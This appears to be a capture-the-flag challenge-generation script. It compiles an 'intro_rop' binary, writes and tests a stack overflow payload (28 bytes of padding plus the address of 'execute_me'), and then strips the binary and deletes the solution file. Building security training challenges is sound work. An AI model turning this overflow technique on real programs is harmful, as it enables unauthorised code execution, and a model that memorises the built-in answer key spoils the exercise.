import subprocess
import os
import sys
from subprocess import check_output
                    # chals_out/chal_name/team_name so 3
sys.path.insert(1, os.path.join(sys.path[0], '../../..'))
from libchals import *

from pwn import *
context.log_level = 'error'
FNULL = open(os.devnull, 'w')

# junk code generation
write_junk_calls("main.c", 44, 3)
write_junk_calls("main.c", 24, 3)
write_junk_calls("main.c", 19)
write_junk_body("main.c", 13)

subprocess.call("make", stdout=FNULL, stderr=FNULL)



# input correction
elf = ELF("intro_rop")
rop = ROP(elf)
execute_me = elf.symbols['execute_me']
padding = b'A' * 28

exploit = padding + p32(execute_me) # rop is saved as input
f = open("input", "wb")
f.write(exploit)
f.close()


# strip it after the ropchain building so they don't have the symbols but we do
subprocess.call(["strip", "intro_rop"], stdout=FNULL, stderr=FNULL)


# TESTING BINARY
f=open("flag.txt", 'r')
flag = f.readline()
try:
    output = subprocess.check_output("./intro_rop < input", shell=True, stderr=subprocess.STDOUT)
except Exception as e:
    output = str(e.output)
if not flag in output:
    fail_test()



os.remove("main.c")
os.remove("Makefile")
os.remove("setup.py")
# solution
os.remove("input")
